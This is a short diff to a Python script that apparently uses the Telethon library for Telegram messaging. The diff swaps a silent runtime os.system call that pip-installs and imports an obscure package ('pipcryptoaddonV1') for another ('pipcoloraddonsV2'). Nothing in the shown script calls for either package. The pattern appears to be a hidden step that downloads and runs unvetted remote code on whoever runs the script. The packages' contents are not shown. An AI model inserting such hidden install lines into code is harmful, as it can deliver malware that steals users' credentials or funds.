@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcryptoaddonV1")
-import pipcryptoaddonV1
+os.system("pip install pipcoloraddonsV2")
+import pipcoloraddonsV2
 from telethon.sync import TelegramClient
 from telethon.tl.types import InputPeerChannel
 from telethon.errors.rpcerrorlist import PeerFloodError, UserPrivacyRestrictedError
